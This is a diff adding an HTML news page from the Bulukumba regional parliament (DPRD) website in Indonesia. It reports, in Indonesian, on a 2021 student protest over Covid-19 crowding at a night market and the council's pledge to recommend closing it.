@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="dprd-bulukumba" name="author">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Website resmi DPRD Kabupaten Bulukumba, provinsi Sulawesi Selatan">
+    <meta name="keywords" content="dprd, bulukumba">
+
+    <!-- SITE TITLE -->
+    <title>DPRD - Kab. Bulukumba</title>
+    <!-- Favicon Icon -->
+    <link rel="shortcut icon" type="image/x-icon" href="http://dprd.bulukumbakab.go.id/_temp/uploads/img/090421215217_favicon_32x32.png">
+    <!-- Animation CSS -->
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/css/animate.css">
+    <!-- Latest Bootstrap min CSS -->
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/bootstrap/css/bootstrap.min.css">
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i" rel="stylesheet">
+    <!-- Icon Font -->
+    <link href="http://dprd.bulukumbakab.go.id/assets/css/ico-moon.css" rel="stylesheet">
+    <!-- Icon Font CSS -->
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/css/ionicons.min.css">
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/css/themify-icons.css">
+    <!-- FontAwesome CSS -->
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/css/all.min.css">
+    <!--- owl carousel CSS-->
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/owlcarousel/css/owl.carousel.min.css">
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/owlcarousel/css/owl.theme.css">
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/owlcarousel/css/owl.theme.default.min.css">
+    <!-- Magnific Popup CSS -->
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/css/magnific-popup.css">
+    <!-- Style CSS -->
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/css/style.css">
+    <link rel="stylesheet" href="http://dprd.bulukumbakab.go.id/assets/css/responsive.css">
+    <link rel="stylesheet" id="layoutstyle" href="http://dprd.bulukumbakab.go.id/assets/color/theme.css">
+    <script src="https://code.iconify.design/1/1.0.7/iconify.min.js"></script>
+    
+</head>
+
+<body data-spy="scroll" data-target=".navbar-nav" data-offset="110">
+
+
+    <!-- START HEADER -->
+    <header class="header_wrap fixed-top light_skin transparent-header">
+        <div class="container">
+            <nav class="navbar navbar-expand-lg">
+                <a class="navbar-brand" href="http://dprd.bulukumbakab.go.id/web/home.html">
+                    <img class="logo_light" src="http://dprd.bulukumbakab.go.id/assets/images/white-logo.png" alt="logo" width="200"/>
+                    <img class="logo_dark" src="http://dprd.bulukumbakab.go.id/assets/images/blue-logo.png" alt="logo" />
+                    <img class="logo_default" src="http://dprd.bulukumbakab.go.id/assets/images/blue-logo.png" alt="logo" />
+                </a>
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"> <span class="ion-android-menu"></span> </button>
+                <div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
+                    <ul class="navbar-nav">
+                        <li>
+                            <a href="http://dprd.bulukumbakab.go.id/web/home.html" class="nav-link"> Beranda</a>
+                        </li>
+
+                        <li class="dropdown">
+                            <a class="dropdown-toggle nav-link active" href="#" data-toggle="dropdown">Profil</a>
+                            <div class="dropdown-menu">
+                                <ul>
+                                    <li>
+                                        <a class="dropdown-item menu-link dropdown-toggler" href="#">DPRD</a>
+                                        <div class="dropdown-menu">
+                                            <ul>
+                                                <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/halaman_dprd/2.html">Sambutan </a></li>
+                                                <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/halaman_dprd/3.html">Profil DPRD</a></li>
+                                                <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/halaman_dprd/1.html">Visi & Misi DPRD</a></li>
+                                            </ul>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <a class="dropdown-item menu-link dropdown-toggler" href="#">SETWAN</a>
+                                        <div class="dropdown-menu">
+                                            <ul>
+                                                <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/halaman_setwan/5.html">Struktur Organisasi </a></li>
+                                                <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/halaman_setwan/1.html">Profil Setwan </a></li>
+                                                <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/halaman_setwan/2.html">Profil Bagian Umum </a></li>
+                                                <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/halaman_setwan/3.html">Profil Bagian Persidangan dan Produk Hukum </a></li>
+                                                <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/halaman_setwan/4.html">Profil Bagian keuangan </a></li>
+                                        </div>
+                                    </li>
+                                </ul>
+                            </div>
+                        </li>
+                        <li>
+                            <a href="http://dprd.bulukumbakab.go.id/web/berita.html" class="nav-link"> Berita</a>
+                        </li>
+                        <li>
+                            <a href="http://dprd.bulukumbakab.go.id/web/anggota.html" class="nav-link"> Anggota</a>
+                        </li>
+                        <li class="dropdown">
+                            <a class="dropdown-toggle nav-link" href="#" data-toggle="dropdown">Komisi</a>
+                            <div class="dropdown-menu">
+                                <ul>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/komisi/1.html">Komisi A</a></li>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/komisi/2.html">Komisi B</a></li>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/komisi/3.html">Komisi C</a></li>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/komisi/4.html">Komisi D</a></li>
+                                </ul>
+                            </div>
+                        </li>
+                        <li class="dropdown">
+                            <a class="dropdown-toggle nav-link" href="#" data-toggle="dropdown">Fraksi</a>
+                            <div class="dropdown-menu">
+                                <ul><li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/fraksi/11.html">PARTAI NASIONAL DEMOKRAT</a></li>                                     
+                                                                            <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/fraksi/12.html">PARTAI GERAKAN INDONESIA RAYA</a></li>                                     
+                                                                            <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/fraksi/13.html">PARTAI KEBANGKITAN BANGSA</a></li>                                     
+                                                                            <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/fraksi/14.html">PARTAI GOLONGAN KARYA</a></li>                                     
+                                                                            <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/fraksi/16.html">BINTANG KEADILAN ( GABUNGAN PBB - PKS )</a></li>                                     
+                                                                            <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/fraksi/17.html">PARTAI AMANAT NASIONAL</a></li>                                     
+                                                                            <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/fraksi/20.html">PARTAI PERSATUAN PEMBANGUNAN ( GABUNGAN PARTAI PPP-HANURA-BERKARYA )</a></li>                                     
+                                                                            <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/fraksi/21.html">DEMOKRASI INDONESIA  ( GABUNGAN PARTAI  PDIP & DEMOKRAT )</a></li>                                     
+                                                                        
+                                </ul>
+                            </div>
+                        </li>
+                        <li class="dropdown">
+                            <a class="dropdown-toggle nav-link" href="#" data-toggle="dropdown"> AKD</a>
+                            <div class="dropdown-menu">
+                                <ul>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/pimpinan.html">Pimpinan DPRD</a></li>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/kehormatan.html">Badan Kehormatan</a></li>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/banggar.html">Badan Anggaran</a></li>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/bamus.html">Badan Musyawarah</a></li>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/bapemperda.html">Badan Pembentukan Peraturan Daerah</a></li>
+                                </ul>
+                            </div>
+                        </li>
+                        <li class="dropdown">
+                            <a class="dropdown-toggle nav-link" href="#" data-toggle="dropdown"> JDIH</a>
+                            <div class="dropdown-menu">
+                                <ul>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/regulasi/1.html">Undang-undang</a></li>
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/regulasi/2.html"">Peraturan Daerah</a></li>                                    
+                                    <li><a class="dropdown-item nav-link nav_item" href="http://dprd.bulukumbakab.go.id/web/regulasi/3.html"">Peraturan Pemerintah</a></li>
+                                </ul>
+                            </div>
+                        </li>
+                        <li class="dropdown">
+                            <a class="dropdown-toggle nav-link" href="#" data-toggle="dropdown"> Informasi</a>
+                            <div class="dropdown-menu">
+                                <ul>
+                                    <li><a class="dropdown-item nav-link nav_item" href="#">Agenda</a></li>
+                                    <li><a class="dropdown-item nav-link nav_item" href="#">Pengumuman</a></li>
+                                </ul>
+                            </div>
+                        </li>
+                        <li class="dropdown">
+                            <a class="dropdown-toggle nav-link" href="#" data-toggle="dropdown"> Galeri</a>
+                            <div class="dropdown-menu">
+                                <ul>
+                                    <li><a class="dropdown-item nav-link nav_item" href="#">Album Foto</a></li>
+                                    <li><a class="dropdown-item nav-link nav_item" href="#">Album Video</a></li>
+                                </ul>
+                            </div>
+                        </li>
+                        <li>
+                            <a href="#" class="nav-link"> Aspirasi</a>
+                        </li>
+                        <li>
+                            <a href="hhtp://ppid.bulukumbakab.go.id" target="_blank" class="nav-link"> PPID</a>
+                        </li>
+                      
+                    </ul>
+                </div>
+                <ul class="navbar-nav attr-nav align-items-center">
+                    <li><a href="javascript:void(0);" class="nav-link search_trigger"><i class="ion-ios-search-strong"></i></a>
+                        <div class="search-overlay">
+                            <span class="close-search"><i class="ion-ios-close-empty"></i></span>
+                            <div class="search_wrap">
+                                <form>
+                                    <input type="text" placeholder="Search" class="form-control" id="search_input">
+                                    <button type="submit" class="search_icon"><i class="ion-ios-search-strong"></i></button>
+                                </form>
+                            </div>
+                        </div>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- START HEADER --><!-- START SECTION BANNER -->
+<section class="background_bg breadcrumb_section overlay_bg2 page-title-light" data-img-src="http://dprd.bulukumbakab.go.id/assets/images/slide-3.png">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="page-title">
+                    <h1>Pimpinan dan Anggota DPRD Bulukumba Terima Aspirasi dari Pergerakan Mahasiswa Islam Indonesia</h1>
+                </div>
+            </div>
+            <div class="col-sm-12">
+                <nav aria-label="breadcrumb">
+                    <ol class="breadcrumb ">
+                        <li class="breadcrumb-item"><a href="http://dprd.bulukumbakab.go.id/web/berita">Semua Berita</a></li>
+
+                        <li class="breadcrumb-item active" aria-current="page">Detail Berita</li>
+                    </ol>
+                </nav>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- END SECTION BANNER -->
+<!-- START SECTION BLOG -->
+<section>
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-lg-6">
+            <div class="single_post">
+                    <div class="blog_img fill" style="width:100%; height:80%">
+                        <a href="#">
+                        <img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/150921143725_Presentation1.jpg" alt="Pimpinan dan Anggota DPRD Bulukumba Terima Aspirasi dari Pergerakan Mahasiswa Islam Indonesia" /></a>
+                    </div>
+                    <blockquote>
+                            	<p>Foto Anggota DPRD Bulukumba dan Mahasiswa</p>
+                            </blockquote>
+                    <div class="blog_content bg-white">
+                        <div class="blog_text">
+                            <h2>Pimpinan dan Anggota DPRD Bulukumba Terima Aspirasi dari Pergerakan Mahasiswa Islam Indonesia</h2>
+                            <ul class="list_none blog_meta">
+                            <li><a href="#"><i class="ion-calendar"></i> 15/09/2021</a></li>
+                                
+                            </ul>
+                            <p>DPRD Bulukumba, - Aliansi Pergerakan Mahasiswa Islam Indonesia (PMII) Universitas Muhammadiyah Bulukumba melaksanakan aksi unjuk rasa di halaman Kantor DPRD Bulukumba. Rabu 15/9/2021.</p><p>. </p><p>Aksi unjuk rasa ini di terima Ketua DPRD Bulukumba H. Rijal, S.Sos dan Anggota DPRD Bulukumba dari Fraksi (Demokrasi Indonesia) Drs. H. Muh. Sabir, Uddin Hamzah, SE dari Fraksi (PPP), Juandy Tandean (Golkar). </p><p>. </p><p>Adapun tuntutan dari mahasiswa yang melakukan aksi unjuk rasa ialah, adanya pasar malam yang berlangsung selama beberapa hari di Kelurahan Terang-Terang Kec. Ujung Bulu, Kab. Bulukumba seputaran pantai merpati, yang memicu kerumunan masyarakat, sehingga adanya pelanggaran protokol kesehatan yang terkesan diabaikan oleh pemerintah daerah. </p><p>. </p><p>Koodinator Aksi Ahmad Azisul Furqan dalam orasinya mengatakan kami mahasiswa selalu diberikan sosialisasi dan pemahaman tentang menjaga jarak dan menghindari kerumunan di masa pandemi Covid-19 ini, tapi pemerintah seakan abai terkait adanya kerumunan pasar malam di sekitar pantai merpati bulukumba.</p><p>.</p><p>"kami mahasiswa menuntut agar kiranya DPRD Bulukumba bertindak terkait adanya pelanggaran protokol kesehatan ini, karena pemerintah daerah seakan mengabaikan frokes Covid-19" Kata Koordinator lapangan Ahmad Azisul Furqan.  </p><p>.</p><p>Sementara itu Ketua DPRD Bulukumba yang H. Rijal, S.Sos yang langsung menerima aspirasi mahasiswa ini mengatakan, akan langsung mengambil sikap terkait kerumunan pasar malam ini, untuk itu DPRD Bulukumba akan langsung memberikan rekomendasi ke pemerintah daerah Kab. Bulukumba.</p><p>.</p><p>"Kami DPRD Bulukumba tidak perlu laksanakan Rapat Dengar Pendapat (RDP) tapi kami akan langsung memberikan rekomendasi ke pemerintah daerah untuk langsung menutup pasar malam tersebut, sesuai dengan aspirasi dari adik-adik mahasiswa". Kata H. Rijal, S.Sos.</p>                            
+                           
+                            
+                        	<div class="py-4 blog_post_footer">
+                                <div class="row justify-content-between align-items-center">
+                                
+                                    <div class="col-md-4">                 
+                                        <ul class="list_none social_icons border_social rounded_social">
+                                            <li><a href="#" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=http://dprd.bulukumbakab.go.id/web/detail_berita/143.html', 'Share This Post', 'width=640,height=450');return false"><i class="ion-social-facebook"></i></a></li>
+                                            <li><a href="#" onclick="window.open('https://twitter.com/share?url=http://dprd.bulukumbakab.go.id/web/detail_berita/143.html&amp;text=Pimpinan dan Anggota DPRD Bulukumba Terima Aspirasi dari Pergerakan Mahasiswa Islam Indonesia', 'Share This Post', 'width=640,height=450');return false"><i class="ion-social-twitter"></i></a></li>
+                                            <li><a href="https://api.whatsapp.com/send?text=Pimpinan dan Anggota DPRD Bulukumba Terima Aspirasi dari Pergerakan Mahasiswa Islam Indonesia - http://dprd.bulukumbakab.go.id/web/detail_berita/143.html"  target="_blank"><i class="iconify" data-icon="bx:bxl-whatsapp" data-inline="false"></i></a></li>
+                                            
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="related_post border-top">
+                	<div class="comment-title mb-2 mb-sm-4">
+                    	<h5>Berita Lainnya</h5>
+                    </div>
+                    <div class="row">
+                                        <div class="col-lg-4 col-md-6 mb-md-4 mb-2 pb-2">
+                        <div class="blog_post blog_style1">
+                            <div class="blog_img fill" style="width:100%; height:198px">
+                                <a href="http://dprd.bulukumbakab.go.id/web/detail_berita/226">
+                                    <img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/141222134316_IMG_0040.JPG" alt="Rapat Pansus I DPRD Kab. Bulukumba">
+                                </a>
+                            </div>
+                            <div class="blog_content bg-white">
+                                <div class="blog_text">
+                                    <h6 class="blog_title"><a href="http://dprd.bulukumbakab.go.id/web/detail_berita/226">Rapat Pansus I DPRD Kab. Bulukumba</a></h6>
+                                    <ul class="list_none blog_meta">
+                                        <li><a href="#"><i class="ion-calendar"></i> 14/12/2022</a></li>
+
+                                    </ul>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                                    <div class="col-lg-4 col-md-6 mb-md-4 mb-2 pb-2">
+                        <div class="blog_post blog_style1">
+                            <div class="blog_img fill" style="width:100%; height:198px">
+                                <a href="http://dprd.bulukumbakab.go.id/web/detail_berita/225">
+                                    <img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/141222133602_IMG_0030.JPG" alt="Rapat Pansus II DPRD Kab. Bulukumba">
+                                </a>
+                            </div>
+                            <div class="blog_content bg-white">
+                                <div class="blog_text">
+                                    <h6 class="blog_title"><a href="http://dprd.bulukumbakab.go.id/web/detail_berita/225">Rapat Pansus II DPRD Kab. Bulukumba</a></h6>
+                                    <ul class="list_none blog_meta">
+                                        <li><a href="#"><i class="ion-calendar"></i> 14/12/2022</a></li>
+
+                                    </ul>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                                    <div class="col-lg-4 col-md-6 mb-md-4 mb-2 pb-2">
+                        <div class="blog_post blog_style1">
+                            <div class="blog_img fill" style="width:100%; height:198px">
+                                <a href="http://dprd.bulukumbakab.go.id/web/detail_berita/224">
+                                    <img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/011222104314_IMG_0148.JPG" alt="Rapat Paripurna DPRD Kab. Bulukumba">
+                                </a>
+                            </div>
+                            <div class="blog_content bg-white">
+                                <div class="blog_text">
+                                    <h6 class="blog_title"><a href="http://dprd.bulukumbakab.go.id/web/detail_berita/224">Rapat Paripurna DPRD Kab. Bulukumba</a></h6>
+                                    <ul class="list_none blog_meta">
+                                        <li><a href="#"><i class="ion-calendar"></i> 01/12/2022</a></li>
+
+                                    </ul>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div><div class="col-lg-4 col-md-6 mb-md-4 mb-2 pb-2">
+                        <div class="blog_post blog_style1">
+                            <div class="blog_img fill" style="width:100%; height:198px">
+                                <a href="http://dprd.bulukumbakab.go.id/web/detail_berita/223">
+                                    <img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/141122115534_IMG_0217.JPG" alt="Aspirasi Keluarga Serikat Buruh dan Sopir Truk Kab. Bulukumba">
+                                </a>
+                            </div>
+                            <div class="blog_content bg-white">
+                                <div class="blog_text">
+                                    <h6 class="blog_title"><a href="http://dprd.bulukumbakab.go.id/web/detail_berita/223">Aspirasi Keluarga Serikat Buruh dan Sopir Truk Kab. Bulukumba</a></h6>
+                                    <ul class="list_none blog_meta">
+                                        <li><a href="#"><i class="ion-calendar"></i> 14/11/2022</a></li>
+
+                                    </ul>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                                    <div class="col-lg-4 col-md-6 mb-md-4 mb-2 pb-2">
+                        <div class="blog_post blog_style1">
+                            <div class="blog_img fill" style="width:100%; height:198px">
+                                <a href="http://dprd.bulukumbakab.go.id/web/detail_berita/222">
+                                    <img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/111122133935_IMG_0221.JPG" alt="Rapat Bapemperda DPRD Kab. Bulukumba">
+                                </a>
+                            </div>
+                            <div class="blog_content bg-white">
+                                <div class="blog_text">
+                                    <h6 class="blog_title"><a href="http://dprd.bulukumbakab.go.id/web/detail_berita/222">Rapat Bapemperda DPRD Kab. Bulukumba</a></h6>
+                                    <ul class="list_none blog_meta">
+                                        <li><a href="#"><i class="ion-calendar"></i> 11/11/2022</a></li>
+
+                                    </ul>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                                    <div class="col-lg-4 col-md-6 mb-md-4 mb-2 pb-2">
+                        <div class="blog_post blog_style1">
+                            <div class="blog_img fill" style="width:100%; height:198px">
+                                <a href="http://dprd.bulukumbakab.go.id/web/detail_berita/221">
+                                    <img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/271022143148_IMG_1901.JPG" alt="Rapat Paripurna DPRD Kab. Bulukumba">
+                                </a>
+                            </div>
+                            <div class="blog_content bg-white">
+                                <div class="blog_text">
+                                    <h6 class="blog_title"><a href="http://dprd.bulukumbakab.go.id/web/detail_berita/221">Rapat Paripurna DPRD Kab. Bulukumba</a></h6>
+                                    <ul class="list_none blog_meta">
+                                        <li><a href="#"><i class="ion-calendar"></i> 27/10/2022</a></li>
+
+                                    </ul>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                                	
+                </div>
+                </div>
+               
+                
+            </div>
+            
+
+            <div class="col-lg-3 mb-lg-0 mb-4 pb-3 pb-lg-0 order-lg-first sticky_column">
+                <div class="sidebar">
+                    <div class="widget">
+    <h5 class="widget_title">Komisi-komisi</h5>
+        <ul class="list_none widget_archive border_bottom_dash">
+                    <li><a href="http://dprd.bulukumbakab.go.id/web/komisi/1"><span class="archive_year">KOMISI A</span></a></li>
+                    <li><a href="http://dprd.bulukumbakab.go.id/web/komisi/2"><span class="archive_year">KOMISI B</span></a></li>
+                    <li><a href="http://dprd.bulukumbakab.go.id/web/komisi/3"><span class="archive_year">KOMISI C</span></a></li>
+                    <li><a href="http://dprd.bulukumbakab.go.id/web/komisi/4"><span class="archive_year">KOMISI D</span></a></li>
+                    <li><a href="http://dprd.bulukumbakab.go.id/web/komisi/9"><span class="archive_year">UNSUR PIMPINAN</span></a></li>
+        
+    </ul>
+</div>
+<div class="widget">
+    <h5 class="widget_title">Kelengkapan Dewan</h5>
+        <ul class="list_none widget_archive border_bottom_dash">
+            <li><a href="http://dprd.bulukumbakab.go.id/web/pimpinan">Pimpinan DPRD</a></li>
+            <li><a href="http://dprd.bulukumbakab.go.id/web/kehormatan">Badan Kehormatan</a></li>
+            <li><a href="http://dprd.bulukumbakab.go.id/web/banggar">Badan Anggaran</a></li>
+            <li><a href="http://dprd.bulukumbakab.go.id/web/bamus">Badan Musyawarah</a></li>
+            <li><a href="http://dprd.bulukumbakab.go.id/web/bapemperda">Badan Pembentukan Peraturan Daerah</a></li>
+            <li><a href="http://dprd.bulukumbakab.go.id/web/anggota">Semua Anggota Dewan</a></li>
+      
+
+    </ul>
+</div>
+<div class="widget ">
+    <script type="text/javascript" src="https://widget.kominfo.go.id/gpr-widget-kominfo.min.js"></script>
+    <div id="gpr-kominfo-widget-container"></div>
+</div>
+
+                </div>
+            </div>
+
+            <div class="col-lg-3 mt-lg-0 mt-4 pt-3 pt-lg-0 sticky_column">
+                <div class="sidebar">
+                    <div class="widget">
+                        <div class="newsletter_form">
+                            <form>
+                                <div class="outline_input-black">
+                                    <input required="" placeholder="Cari Berita..." type="text">
+                                </div>
+                                <button type="submit" title="Subscribe" class="btn btn-submit border-0" name="submit" value="Submit">
+                                    <span class="ti-search"></span>
+                                </button>
+                            </form>
+                        </div>
+                    </div>
+                    <div class="widget">
+    <div class="small_padding bg_blue h-100 d-md-flex justify-content-center flex-md-column about_radius">
+        <div class="text_white">
+            <div class="heading_s3 mb-3">
+                <h3>Pengumuman</h3>
+            </div>
+                        <ul class="list_none widget_archive border_bottom_dash">
+                                    <li><a href="http://dprd.bulukumbakab.go.id/web/pengumuman/1.html"><span class="archive_year">Hari libur Idul Fitri jatuh pada 2-3 Mei 2022 dan cuti bersama 4-6 Mei 2022.</span></a></li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+
+<div class="widget">
+    <div class="small_padding bg_light_green h-100 d-md-flex justify-content-center flex-md-column about_radius">
+        <div class="text_white">
+            <div class="heading_s3 mb-3">
+                <h3>Agenda DPRD</h3>
+            </div>
+                        <ul class="list_none widget_archive border_bottom_dash">
+                                    <li><a href="#"><span class="archive_year">RAPAT PARIPURNA Penyampaian Rekomendasi Pansus DPRD terhadap hasil pembahasan Pansus LKPJ Bupati tahun 2021 dan Sambutan Bupati Bulukumba <br> <small class="text-right">Tanggal : 29/04/2022</small> </span></a></li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+
+<div class="widget">
+    <h5 class="widget_title">Fraksi-fraksi</h5>
+        <ul class="recent_post border_bottom_dash list_none">
+                    <li>
+                <div class="post_footer">
+                    <div class="post_img fill" style="width:60px; height:60px;">
+                        <ahref="http://dprd.bulukumbakab.go.id/web/fraksi/11"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/100421011906_NASDEM.png" alt="PARTAI NASIONAL DEMOKRAT"></a>
+                    </div>
+                    <div class="post_content">
+                        <h6><a href="http://dprd.bulukumbakab.go.id/web/fraksi/11">PARTAI NASIONAL DEMOKRAT</a></h6>
+
+                    </div>
+                </div>
+            </li>
+                    <li>
+                <div class="post_footer">
+                    <div class="post_img fill" style="width:60px; height:60px;">
+                        <a href="http://dprd.bulukumbakab.go.id/web/fraksi/12"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/100421011807_GERINDRA.png" alt="PARTAI GERAKAN INDONESIA RAYA"></a>
+                    </div>
+                    <div class="post_content">
+                        <h6><a href="http://dprd.bulukumbakab.go.id/web/fraksi/12">PARTAI GERAKAN INDONESIA RAYA</a></h6>
+
+                    </div>
+                </div>
+            </li>
+                    <li>
+                <div class="post_footer">
+                    <div class="post_img fill" style="width:60px; height:60px;">
+                        <a href="http://dprd.bulukumbakab.go.id/web/fraksi/13"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/100421011715_PKB.png" alt="PARTAI KEBANGKITAN BANGSA"></a>
+                    </div>
+                    <div class="post_content">
+                        <h6><a href="http://dprd.bulukumbakab.go.id/web/fraksi/13">PARTAI KEBANGKITAN BANGSA</a></h6>
+
+                    </div>
+                </div>
+            </li>
+                    <li>
+                <div class="post_footer">
+                    <div class="post_img fill" style="width:60px; height:60px;">
+                        <a href="http://dprd.bulukumbakab.go.id/web/fraksi/14"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/100421011616_GOLKAR.png" alt="PARTAI GOLONGAN KARYA"></a>
+                    </div>
+                    <div class="post_content">
+                        <h6><a href="http://dprd.bulukumbakab.go.id/web/fraksi/14">PARTAI GOLONGAN KARYA</a></h6>
+
+                    </div>
+                </div>
+            </li>
+                    <li>
+                <div class="post_footer">
+                    <div class="post_img fill" style="width:60px; height:60px;">
+                        <a href="http://dprd.bulukumbakab.go.id/web/fraksi/16"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/100421013127_pbb.png" alt="BINTANG KEADILAN ( GABUNGAN PBB - PKS )"></a>
+                    </div>
+                    <div class="post_content">
+                        <h6><a href="http://dprd.bulukumbakab.go.id/web/fraksi/16">BINTANG KEADILAN ( GABUNGAN PBB - PKS )</a></h6>
+
+                    </div>
+                </div>
+            </li>
+                    <li>
+                <div class="post_footer">
+                    <div class="post_img fill" style="width:60px; height:60px;">
+                        <a href="http://dprd.bulukumbakab.go.id/web/fraksi/17"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/100421011243_PAN.png" alt="PARTAI AMANAT NASIONAL"></a>
+                    </div>
+                    <div class="post_content">
+                        <h6><a href="http://dprd.bulukumbakab.go.id/web/fraksi/17">PARTAI AMANAT NASIONAL</a></h6>
+
+                    </div>
+                </div>
+            </li>
+                    <li>
+                <div class="post_footer">
+                    <div class="post_img fill" style="width:60px; height:60px;">
+                        <a href="http://dprd.bulukumbakab.go.id/web/fraksi/20"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/100421005934_PARTAI_PERSATUAN.png" alt="PARTAI PERSATUAN PEMBANGUNAN ( GABUNGAN PARTAI PPP-HANURA-BERKARYA )"></a>
+                    </div>
+                    <div class="post_content">
+                        <h6><a href="http://dprd.bulukumbakab.go.id/web/fraksi/20">PARTAI PERSATUAN PEMBANGUNAN ( GABUNGAN PARTAI PPP-HANURA-BERKARYA )</a></h6>
+
+                    </div>
+                </div>
+            </li>
+                    <li>
+                <div class="post_footer">
+                    <div class="post_img fill" style="width:60px; height:60px;">
+                        <a href="http://dprd.bulukumbakab.go.id/web/fraksi/21"><img src="http://dprd.bulukumbakab.go.id/_temp/uploads/img/100421011102_DEMOKRAT.png" alt="DEMOKRASI INDONESIA  ( GABUNGAN PARTAI  PDIP & DEMOKRAT )"></a>
+                    </div>
+                    <div class="post_content">
+                        <h6><a href="http://dprd.bulukumbakab.go.id/web/fraksi/21">DEMOKRASI INDONESIA  ( GABUNGAN PARTAI  PDIP & DEMOKRAT )</a></h6>
+
+                    </div>
+                </div>
+            </li>
+        
+    </ul>
+</div>                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- END SECTION BLOG --><!-- START SECTION CLIENT LOGO -->
+<section class="small_pt small_pb gray_bg">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12 animation" data-animation="fadeInUp" data-animation-delay="0.2s">
+                <div class="cl_logo_slider owl-carousel owl-theme" data-margin="30" data-loop="true" data-autoplay="true" data-dots="false" data-autoplay-timeout="2000">
+                                        
+                                                    <div class="item">
